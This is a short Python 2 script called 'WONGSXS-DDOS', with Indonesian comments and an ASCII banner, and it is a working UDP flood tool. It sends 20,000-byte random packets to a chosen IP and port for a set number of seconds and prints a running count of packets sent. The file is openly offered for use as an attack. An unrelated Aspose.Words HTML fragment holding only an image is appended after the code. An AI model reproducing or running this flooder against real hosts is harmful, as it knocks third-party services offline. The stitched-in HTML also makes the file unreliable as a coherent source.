import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#############################################################"
    print "#------------------------[\033[1;91mWONGSXS-DDOS\033[1;32m]---------------------#"
    print "#-----------------------------------------------------------#"
    print "#   \033[1;91mMenjalankan: " "python2 wongsxs.py " "<ip> <port> <packet> \033[1;32m    #"
    print "#                                                           #"
    print "#\033[1;91m Creator:MR Y          wongsxs ddos               #"
    print "#\033[1;91m Team   :MR Y            this is me             #"
    print "#\033[1;91m Version:0.1                   0.1 wongsxs                    #"
    print "#                                                           #"
    print "#                                                           #"
    print "#               \033[1;91m<--[wongsxs javanesse]-->               \033[1;32m#"
    print "#############################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
def flood(victim, vport, duration):
    # Support ME... :)
    # Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMulai \033[1;32m%s \033[1;91mmengirim PAKET \033[1;32m%s \033[1;91mDDOS pada target \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta http-equiv="Content-Style-Type" content="text/css" /><meta name="generator" content="Aspose.Words for .NET 24.6.0" /><title></title><style type="text/css">body { font-family:'Times New Roman'; font-size:12pt }p { margin:0pt }</style></head><body><div><p style="text-align:justify"><img src="images/Aspose.Words.059362ab-3322-4a18-bb41-f2e99e126e95.001.png" width="816" height="1056" alt="" style="-aw-left-pos:0pt; -aw-rel-hpos:column; -aw-rel-vpos:paragraph; -aw-top-pos:0pt; -aw-wrap-type:inline" /></p></div></body></html>
